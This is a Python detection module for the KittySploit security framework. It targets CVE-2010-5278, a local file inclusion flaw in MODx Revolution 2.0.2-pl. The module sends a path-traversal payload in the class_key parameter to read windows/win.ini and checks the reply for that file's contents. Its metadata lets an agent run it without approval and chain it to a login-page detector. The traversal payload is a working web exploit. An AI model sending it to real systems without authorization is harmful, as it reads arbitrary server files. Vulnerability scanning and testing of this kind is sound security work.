#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in manager/controllers/default/resource/tvs."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MODx manager - Local File Inclusion Detection',
        'description': 'A directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl and possibly earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter when magic_quotes_gpc is disabled.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'lfi', 'edb', 'packetstorm', 'modx', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/34788',
            'https://nvd.nist.gov/vuln/detail/CVE-2010-5278',
            'http://packetstormsecurity.org/1009-exploits/modx202pl-lfi.txt',
            'http://modxcms.com/forums/index.php/topic,55104.0.html',
            'http://modxcms.com/forums/index.php/topic,55105.msg317273.html',
        ],
        'cve': 'CVE-2010-5278',
    }

    def run(self):
        r = self.http_request(method="GET", path='/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="MODx manager - Local File Inclusion detected",
                path='/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00',
            )
            return True
        return False

